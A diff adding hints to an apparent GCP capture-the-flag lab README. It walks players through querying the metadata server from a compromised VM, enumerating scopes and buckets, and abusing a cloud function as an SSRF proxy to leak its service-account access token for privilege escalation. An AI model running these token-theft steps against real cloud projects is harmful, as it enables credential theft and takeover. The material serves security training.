@@ -174,9 +174,136 @@ Would that help you to move on into other infrastructure deployed here?
 
 </details>
 
+Did you find the flag yet for this challenge?  
+
+<details>
+  <summary>Hint 1 - find the flag</summary>
+    
+    Flags are just metadata anyway ...
+    Still, can you find it?
+
+</details>
+
+<details>
+  <summary>Hint 2 - find the flag</summary>
+
+    The GCP metadata server is a good endpoint to check when you gained access to a compute VM.  
+    If you don't have the VM's access token yet, you could get it from the metadata server.  
+    It also shows you startup scripts, ssh access information and any other custom data that someone might have stored as metadata for this VM.  
+    `curl "http://metadata.google.internal/computeMetadata/v1/instance/" -H "Metadata-Flavor: Google"`  
+
+</details>
+
 
 ### Challenge 4: Invoking answers
+
+You can controll a compute instance in the project!  
+Let's look around a bit to find out what this instance can do and which other services are running in this GCP project.  
+Your compute instance is running as a GCP service account, allowing it to interact with the GCP APIs.  
+Check which service account this instance uses and what this account can do.  
+
+`gcloud auth list` shows you who you are.  
+That account looks like the compute engine default service account! A very powerfull account in GCP.  
+By default, it has the "Editor" role on a GCP project! But before getting too excited ... try using some of your new powers:  
+`gcloud compute instances list`  
+
+"Request had insufficient authentication scopes". Well, that's disappointing.  
+You can list your oauth access scopes with this command:  
+`curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=$(gcloud auth print-access-token)`
+
+That last access scope looks promising.
+
+<details>
+  <summary>Hint 1</summary>
+
+    The access scopes of the compute engine allow you to read all storage buckets in the project.  
+    `gcloud storage buckets list`  
+    There is a second bucket that you couldn't access before.  
+    Its content reveals another resource deployed in this project.  
+    `gsutil ls gs://<bucket-name>` lets you list files on the bucket.  
+    `gsutil cat gs://<bucket-name>` lets you read files on the bucket.  
+
+</details>
+
+<details>
+  <summary>Hint 2</summary>
+
+    A cloud function is running in the project. When deploying a cloud function in GCP, its source code gets uploaded onto a storage bucket. Have a look at the source code to see what this small function does.
+    You can find additional hints on how to invoke the function on the compute engine VM.  
+
+</details>
+
+<details>
+  <summary>Hint 3</summary>
+
+    A cloud function is running in the project. When deploying a cloud function in GCP, its source code gets uploaded onto a storage bucket. Have a look at the source code to see what this small function does.
+    You can find additional hints on how to invoke the function on the compute engine VM.  
+
+</details>
+
+<details>
+  <summary>Hint 4</summary>
+
+    Can you call the function from the VM? It responds with 403 Forbidden when you try it without credentials.  
+    Maybe you can pass your VMs token as a credential as Authorization header? `curl -H "Authorization:Bearer <token>" https://...`  
+    Your access token doesn't seem to work through. Is there another token type you could try?
+
+</details>
+
+<details>
+  <summary>Hint 5</summary>
+
+    Cloud functions use an identity token instead of an access token to check if the caller is allowed to invoke them.  
+    You can get the identity token of the compute VM in the same way as you would do it for the access token:  
+    `gcloud auth print-identity-token`  
+    Now you can try calling the function:  
+    `curl -H "Authorization:Bearer $(gcloud auth print-identity-token)" https://<function-endpoint>`  
+    It seems to expect a URL and then it returns the response.  
+
+</details>
+
+<details>
+  <summary>Hint 6</summary>
+
+    Which endpoint could you have the cloud function call?  
+    Similar to the compute engine, the cloud function also uses the Metadata server ...
+
+</details>
+
+<details>
+  <summary>Hint 7</summary>
+
+    You can pass the URL to the metadata server to the function and have it call it.  
+    This way, you can make it leak its access token.  
+    `curl -H "Authorization:Bearer $(gcloud auth print-identity-token)" -d '{"url": "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"} -H "Metadata-Flavor: Google" https://<function-endpoint>`  
+
+</details>
+
+Useful commands and tools:  
+
+- the compute engine also has gcloud installed
+- `gcloud auth list`
+- `gcloud auth print-access-token`
+- `gcloud auth print-identity-token`
+- [GCP oauth access scopes](https://developers.google.com/identity/protocols/oauth2/scopes#storage)
+- `gsutil ls gs://<..>`
+- `gsutil cat gs://<..>`
+- `curl -H "Authorization:Bearer <token>" https://...`
+- [Metadata server](https://cloud.google.com/functions/docs/securing/function-identity#access-tokens)
+
 ### Challenge 5: In the shoes of an admin
+
+You extracted a new access token! Let's see what this one can do.  
+You can use the tokeninfo endpoint again to find out:  
+`curl -i https://www.googleapis.com/oauth2/v3/tokeninfo\?access_token=<token>`  
+Cloud functions by default are also using the compute engine default service account - but with the full `cloud-platform` access scope!  
+
+That should get you a set of nice new permissions on this GCP project.  
+You can view them using this command:  
+`gcloud projects get-iam-policy <project-id> --access-token-file <path-to-token-file>`
+
+Useful commands and tools:
+
 
 
 
